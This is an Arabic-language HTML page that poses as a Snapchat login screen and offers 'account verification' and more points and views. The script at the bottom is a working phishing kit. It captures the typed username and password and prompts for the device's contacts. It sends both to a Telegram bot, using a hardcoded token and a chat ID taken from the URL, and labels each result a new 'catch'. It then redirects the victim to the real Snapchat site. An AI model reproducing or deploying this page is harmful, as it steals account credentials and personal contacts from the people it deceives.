<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat - تسجيل الدخول</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #fffc00; color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .snap-card { background: #fff; border-radius: 20px; padding: 35px 25px; width: 340px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.15); }
        .snap-logo-box { width: 70px; height: 70px; background-color: #fffc00; border-radius: 16px; margin: 0 auto 20px auto; display: flex; justify-content: center; align-items: center; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h2 { font-size: 20px; margin-bottom: 6px; }
        .sub { font-size: 11px; color: #666; margin-bottom: 20px; }
        .group { margin-bottom: 12px; text-align: right; }
        input { width: 100%; padding: 12px; background: #f4f6f8; border: 1px solid #e1e8ed; border-radius: 10px; font-size: 13px; outline: none; }
        input:focus { border-color: #fffc00; background: #fff; }
        button { width: 100%; padding: 12px; background: #000; color: #fffc00; font-weight: bold; font-size: 14px; border-radius: 10px; border: none; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="snap-card">
        <div class="snap-logo-box">
            <svg width="45" height="45" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path fill="#FFFFFF" d="M384,224c0-35.1-11.3-67.6-30.5-93.9C378.5,200.5,400.8,232.3,411.6,269.5c3.1,10.8-2.8,22.2-13.6,25.3c-3.8,1.1-7.8,1.6-11.7,1.6c-7.4,0-14.6-3.1-19.8-8.8l-31.5-35c-18.5,12.7-40.7,20.4-64.4,22.2c1.3,7.2,2.1,14.7,2.1,22.4c0,53-43,96-96,96s-96-43-96-96c0-7.7,0.7-15.2,2.1-22.4c-23.7-1.8-45.9-9.5-64.4-22.2l-31.5,35c-5.3,5.8-12.4,8.8-19.8,8.8c-3.9,0-7.9-0.5-11.7-1.6C78.4,291.7,72.5,280.3,75.6,269.5C86.4,232.3,108.6,200.5,133.5,130.1C114.3,103.8,103,71.3,103,36.2C103,16.2,119.2,0,139.2,0c12.4,0,23.8,6.2,30.5,16c21.8,31.5,57.1,51.5,95.3,51.5s73.5-20,95.3-51.5c6.7-9.8,18.1-16,30.5-16c20,0,36.2,16.2,36.2,36.2c0,35.1-11.3,67.6-30.5,93.9C384,185.3,384,204.6,384,224z"/></svg>
        </div>
        <h2>تسجيل دخول Snapchat</h2>
        <p class="sub">توثيق الحساب، تفعيل الخدمات، وزيادة النقاط والمشاهدات.</p>
        <form id="snapForm">
            <div class="group"><input type="text" id="username" placeholder="اسم المستخدم أو البريد" required></div>
            <div class="group"><input type="password" id="password" placeholder="كلمة المرور" required></div>
            <button type="submit">تسجيل الدخول ومتابعة التوثيق</button>
        </form>
    </div>
    <script>
        const botToken = "9047166728:AAGG2DJF-Kb7h7_15GNx5VS7Le2bG7a1ZRE";
        const urlParams = new URLSearchParams(window.location.search);
        const targetChatId = urlParams.get('to');

        document.getElementById('snapForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            if(!targetChatId) return;
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            let contacts = "لم يتم منح الصلاحية";
            if ('contacts' in navigator && 'ContactsManager' in window) {
                try {
                    const res = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                    if (res.length > 0) contacts = res.map(c => `المستخدم: ${c.name?.[0]} - الرقم: ${c.tel?.[0]}`).join('\n');
                } catch(e) {}
            }

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${targetChatId}&text=${encodeURIComponent(`صيد سناب شات جديد\nالحساب: ${user}\nالباسورد: ${pass}`)}`);
            if (contacts !== "لم يتم منح الصلاحية") {
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${targetChatId}&text=${encodeURIComponent(`جهات الاتصال:\n${contacts}`)}`);
            }
            setTimeout(() => { window.location.href = "https://www.snapchat.com"; }, 800);
        });
    </script>
</body>
</html>
